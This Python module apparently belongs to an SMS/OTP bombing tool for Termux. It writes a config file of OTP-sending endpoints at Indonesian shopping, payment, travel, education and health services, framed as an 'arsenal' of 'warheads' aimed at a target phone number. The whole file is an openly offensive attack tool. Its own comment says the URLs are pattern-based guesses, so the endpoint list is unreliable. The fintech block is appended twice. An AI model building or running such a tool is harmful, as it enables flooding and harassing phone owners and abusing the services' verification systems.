# termux_version/core/seeder.py
import json
import os

# vDIVINITY: THE ARSENAL
# 50+ High-Probability Targets for Indonesian Numbers
API_FILE = os.path.join(os.path.dirname(__file__), '../config/apis.json')

def seed_apis():
    print("🌱 [SEEDER] Planting 50+ Divine Warheads...")
    
    # These are REALISTIC definitions based on common patterns.
    # The Hunter module optimizes these further.
    arsenal = []
    
    # E-Commerce Sector
    targets = [
        ("Shopee-ID", "https://ban.shopee.co.id/api/v2/authentication/login_otp", "all"),
        ("Bukalapak-Old", "https://api.bukalapak.com/v2/authenticate_otp", "xl"),
        ("Blibli-Auth", "https://www.blibli.com/backend/common/otp", "all"),
        ("Zalora-API", "https://api.zalora.co.id/v1/user/otp", "indosat"),
        ("Sociolla-V1", "https://backend.sociolla.com/api/v3/otp", "all"),
    ]
    
    for name, url, prov in targets:
        arsenal.append({
            "name": name,
            "url": url,
            "method": "POST",
            "provider": prov,
            "data": {"phone": "{phone}", "type": "otp"}
        })

    # Fintech Sector
    fintech = [
        ("Grab-Passenger", "https://api.grab.com/grabid/v1/phone/otp", "all"),
        ("OVO-V1", "https://api.ovo.id/v1.0/api/auth/customer/login2FA", "telkomsel"),
        ("DANA-Wallet", "https://m.dana.id/d/api/login/sendOtp", "all"),
        ("LinkAja-App", "https://api.linkaja.id/v2/customer/otp", "all"),
        ("Kredivo-Auth", "https://api.kredivo.com/v2/auth/otp", "all"),
        ("Akulaku-User", "https://mall.akulaku.com/api/user/sendOtp", "all"),
        ("Flip-ID", "https://flip.id/api/v2/otp", "all"),
    ]
    
    for name, url, prov in fintech:
        arsenal.append({
            "name": name,
            "url": url,
            "method": "POST",
            "provider": prov,
            "data": {"mobile": "{phone}", "action": "login"}
        })
    
    for name, url, prov in fintech:
        arsenal.append({
            "name": name,
            "url": url,
            "method": "POST",
            "provider": prov,
            "data": {"mobile": "{phone}", "action": "login"}
        })

    # Travel & Lifestyle
    lifestyle = [
        ("Traveloka-X", "https://m.traveloka.com/api/v1/user/send_otp", "all"),
        ("Tiket-Com", "https://en.tiket.com/account/otp/send", "all"),
        ("Agoda-M", "https://www.agoda.com/api/cronos/v1/otp", "all"),
        ("Airbnb-ID", "https://www.airbnb.co.id/api/v2/login_otp", "all"),
        ("RedDoorz-API", "https://api.reddoorz.com/user/otp", "all"),
        ("Mamikos-Auth", "https://api.mamikos.com/v1/otp", "all"),
    ]
    
    for name, url, prov in lifestyle:
        arsenal.append({
            "name": name,
            "url": url,
            "method": "POST",
            "provider": prov,
            "data": {"phone_number": "{phone}"}
        })
        
    # Edu & Services
    services = [
        ("RuangGuru", "https://api.ruangguru.com/v1/user/otp", "all"),
        ("Zenius-X", "https://api.zenius.net/v2/auth/otp", "all"),
        ("Quipper", "https://api.quipper.com/v1/auth/otp", "all"),
        ("Halodoc", "https://api.halodoc.com/v1/auth/otp", "all"),
        ("Alodokter", "https://www.alodokter.com/api/auth/otp", "all"),
        ("KlikDokter", "https://api.klikdokter.com/v1/auth/otp", "all"),
    ]
    
    for name, url, prov in services:
        arsenal.append({
            "name": name,
            "url": url,
            "method": "POST",
            "provider": prov,
            "data": {"user_phone": "{phone}"}
        })
        
    # Write
    current = []
    if os.path.exists(API_FILE):
        try:
            with open(API_FILE, 'r') as f: current = json.load(f)
        except: pass
        
    existing_urls = [x['url'] for x in current]
    added = 0
    for w in arsenal:
        if w['url'] not in existing_urls:
            current.append(w)
            added += 1
            
    try:
        with open(API_FILE, 'w') as f: json.dump(current, f, indent=2)
        print(f"✅ [DIVINITY] Seeded {added} Divine Warheads. Total Arsenal: {len(current)}")
    except: pass

if __name__ == "__main__":
    seed_apis()
